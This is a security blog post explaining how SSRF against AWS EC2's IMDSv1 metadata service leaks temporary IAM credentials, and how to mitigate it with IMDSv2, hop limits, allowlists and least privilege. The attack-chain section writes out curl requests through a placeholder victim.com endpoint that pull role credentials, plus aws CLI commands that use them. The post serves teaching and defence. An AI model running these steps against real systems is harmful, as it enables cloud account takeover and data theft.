---
layout: post
title:  "AWS IMDSv1 SSRF"
date:   2026-08-08 18:00:00 +0800
author: allencharp
tags: [web-security, cloud-security, aws, ssrf]
---

# Introduction

AWS EC2 instances expose an **Instance Metadata Service (IMDS)** at the link-local address `169.254.169.254`. It serves instance data — including, most dangerously, **temporary IAM credentials** when the instance runs with an IAM role. Combined with a Server-Side Request Forgery (SSRF) vulnerability, IMDS turns a "read a URL" bug into full cloud account compromise.

This post walks through the classic attack chain (SSRF → IMDS → credential theft), the difference between IMDSv1 and IMDSv2, and how to defend against it.

# What is the Instance Metadata Service

IMDS is available on every EC2 instance as a simple HTTP API:

```bash
# IMDS is only reachable from inside the instance
curl http://169.254.169.254/latest/meta-data/

# list the IAM role attached to this instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

With **IMDSv1**, any process on the instance (or any SSRF) can read these endpoints with a plain GET — no authentication. With an IAM role attached, the credentials endpoint returns a full temporary credential set:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-08-08T19:00:00Z"
}
```

# IMDSv1 vs IMDSv2

**IMDSv1** — a plain GET request returns the data. Trivially exploitable via SSRF.

**IMDSv2** — session-based: the client must first `PUT` to get a token, then send it in the `X-aws-ec2-metadata-token` header:

```bash
# IMDSv2 flow
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

Because IMDSv2 requires a custom method (`PUT`) and a custom header, most SSRF sinks (that only issue GET, or strip custom headers) fail to fetch it — that is the whole point.

> IMDSv2 is not a perfect SSRF defense (some SSRF vectors can still send PUT/headers), but it raises the bar dramatically.

# The Attack Chain: SSRF → Credential Theft

The classic chain, as seen in real-world incidents (e.g. the 2019 Capital One breach):

1. **Find an SSRF** — an endpoint that fetches a user-supplied URL, e.g. `GET /fetch?url=...` or an image-resize service.
2. **Query the metadata service**:
   ```bash
   curl "http://victim.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   ```
3. **List roles**, then fetch the credentials of the attached role:
   ```bash
   curl "http://victim.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
   ```
4. **Use the credentials** to call the AWS API with the instance's privileges:
   ```bash
   export AWS_ACCESS_KEY_ID=ASIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws sts get-caller-identity
   aws s3 ls                    # read/write any bucket the role allows
   ```

The blast radius equals the **IAM permissions of the role attached to the instance**. A role that allows `s3:*` or `ec2:RunInstances` turns this into data exfiltration or even persistent backdoors.

# Mitigation

## 1. Enforce IMDSv2 (the most important control)

```bash
# require IMDSv2 tokens on an instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled
```

This blocks most SSRF → IMDS paths immediately.

## 2. Limit IMDS hops

Restrict the IMDS hop limit to `1` (`--http-put-response-hop-limit 1`), so the metadata service only answers local processes, not requests forwarded through a container or another host.

## 3. Fix the SSRF itself

* Whitelist allowed hosts/URLs with exact matching; never let users control the full URL.
* Disable non-HTTP schemes (`file://`, `gopher://`, ...) and block redirects to link-local ranges.
* Block `169.254.0.0/16` (and all private ranges) at egress firewalls/proxies.

## 4. Least privilege

* Attach minimal IAM roles to instances; no role at all is the safest for static workloads.
* Use permission boundaries and audit role policies regularly.

## 5. Monitor and detect

* CloudTrail alerts for `sts:GetCallerIdentity` / unusual API calls from instance roles.
* GuardDuty EC2 findings (e.g. credential exfiltration, unusual IAM user activity).

# Summary

AWS IMDSv1 SSRF is the poster child of cloud-native attacks: a web bug (SSRF) escalates to cloud account compromise in four HTTP requests. The defense is layered — enforce IMDSv2, keep hop limits at 1, fix SSRF sinks with strict allowlists, and run instances with the least privilege possible.
